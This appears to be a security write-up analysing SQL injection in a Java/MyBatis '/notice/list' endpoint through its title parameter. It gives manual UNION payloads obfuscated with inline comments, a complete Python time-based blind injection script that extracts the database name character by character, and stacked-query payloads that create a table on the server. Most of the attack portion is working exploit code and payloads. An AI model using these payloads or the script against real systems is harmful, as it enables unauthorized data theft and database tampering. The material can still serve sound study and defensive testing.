|  | > ------------------------------------------ |
|  | > [Attack Analysis] |
|  |  |
|  | Controller Layer |
|  | Endpoint: /notice/list |
|  | HTTP Method: GET |
|  | Parameters: Only the title parameter is required for queries. |
|  |  |
|  | Service Layer |
|  | Method: selectUserPage |
|  | Implementation: Simple and lacks filtering; directly uses the Data Transfer Object (DTO) as query parameters, relying on MyBatis for automatic field mapping. |
|  |  |
|  | SQL Injection Testing Process |
|  | Step 1: Debugging Output |
|  | Enable debugging output in the configuration file: |
|  |  |
|  | properties |
|  | Copy code |
|  | mybatis-plus.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl |
|  | Step 2: Manual Injection Testing |
|  | Instead of using automated tools like sqlmap (which failed in this case), manual testing was conducted for SQL injection. |
|  |  |
|  | Initial Payloads: |
|  |  |
|  | Payload: '-- |
|  | Result: No errors reported. |
|  | Payload: 'union/\*\*/select/\*\*/database()-- |
|  | Result: An error was reported. On inspecting the SQL execution logs, the error was caused by a missing closing ) due to pagination in the query. |
|  | Adjusting the payload: |
|  |  |
|  | Corrected Payload: ')as/\*\*/total/\*\*/union/\*\*/select/\*\*/database()-- |
|  | This resulted in the following complete SQL statement: |
|  |  |
|  | sql |
|  | Copy code |
|  | SELECT COUNT(\*) FROM (SELECT \* FROM notice WHERE platform = 3 AND title LIKE '%')as/\*\*/total/\*\*/union/\*\*/select/\*\*/database()-- %' ORDER BY createTime DESC) TOTAL |
|  | Outcome: |
|  | The SQL script executed successfully in a standalone SQL environment. However, on the server, the injection caused errors due to hardcoded newline characters, preventing proper execution. Since a ; was needed to terminate the query properly, blind injection was explored. |
|  |  |
|  | Blind SQL Injection |
|  | To test whether SQL statements can be executed, time-based blind SQL injection was used. |
|  |  |
|  | Script for Extracting Database Name Using Time-Based Blind Injection: |
|  | python |
|  | Copy code |
|  | import requests |
|  | import time |
|  |  |
|  | url = "http://x.x.x.x:32145/notice/list?title=" |
|  |  |
|  | headers = { |
|  | 'User-Agent': 'Mozilla/5.0' |
|  | } |
|  | characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\_' |
|  |  |
|  | def inject\_payload(position, char): |
|  | payload = f"')/\*\*/AS/\*\*/total/\*\*/UNION/\*\*/(SELECT/\*\*/5211/\*\*/FROM/\*\*/(SELECT/\*\*/IF(SUBSTRING(DATABASE(),{position},1)='{char}',SLEEP(5),0))/\*\*/AS/\*\*/delay);" |
|  |  |
|  | params = {'title': payload} |
|  |  |
|  | start\_time = time.time() |
|  | response = requests.get(url, params=params, headers=headers) |
|  | elapsed\_time = time.time() - start\_time |
|  |  |
|  | # Check if the server response was delayed |
|  | if elapsed\_time > 5: |
|  | return True |
|  | return False |
|  |  |
|  | def get\_database\_name(): |
|  | database\_name = "" |
|  | for position in range(1, 50): |
|  | for char in characters: |
|  | if inject\_payload(position, char): |
|  | database\_name += char |
|  | print(f"Found character '{char}' at position {position}") |
|  | break |
|  | else: |
|  | break |
|  | return database\_name |
|  |  |
|  | # Start the blind injection attack |
|  | database\_name = get\_database\_name() |
|  | print(f"The database name is: {database\_name}") |
|  | Result: |
|  | Since the query could be terminated with ;, stacked queries were attempted. Due to the lack of output, operations like CREATE and DROP were tested. |
|  |  |
|  | Example Payload for Creating a Table: |
|  | sql |
|  | Copy code |
|  | ')as/\*\*/total/\*\*/union/\*\*/select/\*\*/database();create/\*\*/table/\*\*/test(birthdate/\*\*/DATE);--%20 |
|  | Outcome: |
|  | The server returned a 500 error, but the SQL operation (creating a test table) was successfully executed. |
